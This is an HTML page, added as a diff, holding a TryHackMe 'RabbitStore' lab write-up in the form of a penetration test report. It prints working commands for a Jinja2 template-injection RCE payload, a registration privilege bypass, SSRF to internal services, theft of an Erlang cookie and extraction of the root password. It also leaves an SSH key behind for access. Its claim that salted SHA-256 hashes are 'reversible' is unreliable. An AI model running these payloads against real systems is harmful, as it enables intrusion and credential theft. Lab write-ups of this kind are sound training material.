@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target 10.65.167.82 (RabbitStore). The assessment identified four open ports and a web application with multiple ch">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="RabbitStore — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>RabbitStore — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">RabbitStore — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2026-07-08</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.65.167.82 <strong>Assessment Date:</strong> 2026-07-08 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target 10.65.167.82 (RabbitStore). The assessment identified four open ports and a web application with multiple chained vulnerabilities. Initial access was gained through a Server-Side Template Injection (SSTI) in a Node.js/Flask application, leading to user-level access as <code>azrael</code>. Privilege escalation was achieved by leveraging an exposed Erlang cookie for RabbitMQ, extracting hashed credentials from the RabbitMQ definitions, and decoding them to obtain the root password. Full compromise of the target was achieved with both user and root flags captured.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.65.167.82</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22 (SSH), 80 (HTTP), 4369 (epmd), 25672 (RabbitMQ)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Apache 2.4.52, Node.js Express, RabbitMQ 3.9.13, Flask</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Ubuntu Linux, AWS EC2 (t3a.medium), us-east-1b</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Web app (subscription bypass → active user) → SSRF → internal API docs → SSTI (Jinja2 RCE) → azrael shell → Erlang cookie → rabbitmqctl export → hash decode → su - root</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Server-Side Template Injection (SSTI) — Jinja2 RCE</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Suboptimal Access Control — Subscription Parameter Manipulation</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Server-Side Request Forgery (SSRF) — Internal Service Discovery</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Exposed Erlang Cookie — RabbitMQ Credential Access</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Weak RabbitMQ Password Storage — Reversible Password Hash</td>
+<td>7.8</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: Server-Side Template Injection (SSTI) — Jinja2 RCE</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> <code>POST /api/fetch_messeges_from_chatbot</code></p>
+<p><strong>Description:</strong> The chatbot endpoint accepts a <code>username</code> parameter that is rendered unsafely inside a Jinja2 template. An attacker can inject template expressions that are evaluated server-side, leading to arbitrary command execution.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -H &quot;Cookie: jwt=&lt;valid_jwt&gt;&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;{{ self.__init__.__globals__.__builtins__.__import__(\&quot;os\&quot;).popen(\&quot;id\&quot;).read() }}&quot;}&#x27; \
+  http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot</code></pre>
+<p><strong>Impact:</strong> Full remote code execution as user <code>azrael</code>. Exfiltration of files, installation of SSH keys, pivoting to internal services.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — Network exploitable, low complexity, requires authentication but no user interaction, scope change, high CIA impact.</p>
+<hr>
+<h3>F-02: Suboptimal Access Control — Subscription Parameter Manipulation</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>POST /api/register</code></p>
+<p><strong>Description:</strong> The registration endpoint accepts a <code>subscription</code> parameter. Setting it to <code>active</code> during registration grants immediate access to admin-level functionality without approval.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;,&quot;subscription&quot;:&quot;active&quot;}&#x27; \
+  http://storage.cloudsite.thm/api/register</code></pre>
+<p><strong>Impact:</strong> Unauthorized access to restricted endpoints including file upload, SSRF, and SSTI endpoints.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — No authentication required, no user interaction, high confidentiality and integrity impact.</p>
+<hr>
+<h3>F-03: Server-Side Request Forgery (SSRF) — Internal Service Discovery</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> <code>POST /api/store-url</code></p>
+<p><strong>Description:</strong> The URL fetch endpoint accepts arbitrary URLs and retrieves content from internal services, including the AWS instance metadata service at 169.254.169.254. This leaks IAM credentials and enables discovery of the internal Node.js API documentation.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -X POST -H &quot;Cookie: jwt=&lt;valid_jwt&gt;&quot; -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;url&quot;:&quot;http://127.0.0.1:3000/api/docs&quot;}&#x27; \
+  http://storage.cloudsite.thm/api/store-url</code></pre>
+<p><strong>Impact:</strong> Disclosure of AWS IAM credentials, discovery of the SSTI-vulnerable endpoint.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N — Requires auth but grants access to internal resources with high confidentiality impact.</p>
+<hr>
+<h3>F-04: Exposed Erlang Cookie — RabbitMQ Credential Access</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8) <strong>Affected Component:</strong> <code>/var/lib/rabbitmq/.erlang.cookie</code></p>
+<p><strong>Description:</strong> The Erlang cookie file is world-readable (<code>-r-----r--</code>), allowing any local user to read it. The cookie authenticates Erlang nodes and can be used to issue admin commands to the RabbitMQ cluster.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>cat /var/lib/rabbitmq/.erlang.cookie
+rabbitmqctl --erlang-cookie &#x27;X&#x27; --node rabbit@forge export_definitions /tmp/defs.json</code></pre>
+<p><strong>Impact:</strong> Full administrative access to RabbitMQ, enabling export of user credentials including the root password hash.</p>
+<p><strong>CVSS Justification:</strong> AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — Local access required, but leads to complete system compromise.</p>
+<hr>
+<h3>F-05: Weak RabbitMQ Password Storage — Reversible Password Hash</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.8) <strong>Affected Component:</strong> RabbitMQ user database</p>
+<p><strong>Description:</strong> RabbitMQ stores passwords as <code>base64(salt + sha256(salt + password))</code>. This format allows anyone with the hash and knowledge of the algorithm to trivially recover the password by decoding the base64 and stripping the 4-byte salt — no cracking required.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>echo -n &#x27;&lt;base64_hash&gt;&#x27; | base64 -d | xxd -p -c 100 | cut -c9-</code></pre>
+<p><strong>Impact:</strong> Recovery of the root user's password in plaintext, enabling full root access via <code>su -</code>.</p>
+<p><strong>CVSS Justification:</strong> AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — Requires local access but trivial to exploit once obtained.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ol>
+<li><strong>(F-01)</strong> Sanitize user input in Jinja2 templates. Use <code>{% raw %}...{% endraw %}</code> or switch to plain string formatting without template evaluation.</li>
+<li><strong>(F-02)</strong> Remove the <code>subscription</code> parameter from the registration endpoint; implement proper server-side activation workflow.</li>
+<li><strong>(F-03)</strong> Restrict the <code>store-url</code> endpoint to allow only necessary outbound URLs; block access to private IP ranges (RFC 1918) and the AWS metadata IP.</li>
+<li><strong>(F-04)</strong> Restrict the Erlang cookie file permissions to owner-only (<code>chmod 400</code> owned by <code>rabbitmq</code>).</li>
+<li><strong>(F-05)</strong> Upgrade RabbitMQ to a version that uses a proper password hashing scheme with strong salts and multiple iterations; consider external authentication backends (LDAP, OAuth).</li>
+</ol>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>user.txt:</strong> <code>98d3a30fa86523c580144d317be0c47e</code></li>
+<li><strong>root.txt:</strong> <code>eabf7a0b05d3f2028f3e0465d2fd0852</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] Temp files removed from target</li>
+<li>[x] No shells left running</li>
+<li>[x] SSH key left for continued access (if authorized)</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
